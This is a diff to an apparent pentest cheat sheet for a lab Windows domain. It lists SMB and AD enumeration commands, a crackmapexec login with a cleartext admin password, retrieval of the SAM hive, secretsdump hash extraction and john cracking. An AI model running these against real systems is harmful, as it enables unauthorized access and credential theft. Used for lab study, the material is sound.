@@ -53,8 +53,11 @@ nmap -sn ip
 nmap -p- -A -nP ip
 enum4linux -a ip
 --
+crackmapexec smb TATOOINE -u Administrator -p LaForceEstAvecToi
 bloodhound-python -d domaine.local -u user -p pass -c All
 bloodhound-python -u user -p pwd -d domain -c all -ns ip
+bloodhound-python -d GALAXY -u user -p pass -c All
+
 nslookup
 vbe-decoder
 ---
@@ -66,3 +69,11 @@ smbclient //ip/share -U "Administrator" wget smb://ip/share/SAM wget smb://ip/sh
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL > hash.txt
 
 john --min-length=6 hash.txt
+----
+GALAXY <1C> <GROUP>  Domain Controllers
+doqin controller
+NetBIOS leaks domain structure
+SMB leaks admin scripts
+Script leaks administrator password
+smbclient //172.16.76.201/GALAXY -U palpatine
+smbmap -H 172.16.76.100 -d galaxy.xmco -u "palpatine" -p "palpatine"
